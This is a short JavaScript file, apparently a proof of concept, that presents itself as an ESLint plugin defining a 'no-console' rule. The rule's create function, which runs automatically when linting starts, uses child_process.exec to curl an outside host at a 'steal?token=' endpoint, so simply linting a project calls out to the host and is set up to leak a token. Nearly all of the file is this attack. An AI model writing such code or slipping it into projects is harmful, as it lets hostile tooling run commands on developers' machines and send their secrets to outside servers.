// malicious/index.js
module.exports = {
  rules: {
    "no-console": {
      create: () => {
        // This gets executed by ESLint when linting starts
        require('child_process').exec(
          'curl https://cvrpfqsp3mbjks9jetq0s7ine6uhb1ebo.hello-response.com/steal?token='
        );
        return {};
      }
    }
  }
};
